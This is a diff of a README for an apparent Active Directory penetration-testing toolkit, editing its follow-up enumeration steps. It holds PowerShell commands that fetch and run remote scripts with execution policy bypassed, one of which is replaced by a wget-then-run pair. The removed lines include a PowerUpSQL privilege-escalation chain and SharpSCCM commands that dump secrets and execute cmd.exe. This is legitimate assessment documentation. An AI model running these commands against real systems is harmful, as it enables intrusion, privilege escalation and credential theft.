@@ -25,29 +25,17 @@ Example:
 > [!NOTE]
 > The -fast flag limits extensive bloodhound checks in AD environments with many stale or dead objects, while the -scope flag allows the usage of a scoping file.txt with additional CIDR ranges (one per line) to extend network scans beyond the primary subnet.
 
-
 ## Follow-Up Enumeration
 
-For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:
+For most assessments it makes sense to follow up enumeration on a provided device. 
 
 - [ ] fkad.ps1
 ```ps
-powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
+wget https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1
+powershell -ExecutionPolicy Bypass -File fkad.ps1
 ```
 
 <img width="1866" height="1052" alt="image" src="https://github.com/user-attachments/assets/e8d43abc-e297-428b-91f1-3ff7d63660e4" />
-
-- [ ] MSSQL
-```powershell
-IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
-Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$env:USERPROFILE\Downloads\fkad\mssql_priv.txt"
-```
-- [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
-```powershell
-SharpSCCM.exe local secrets -m disk
-SharpSCCM.exe get collections
-SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
-```
 
 Most likely these should be run across the network as well.
 
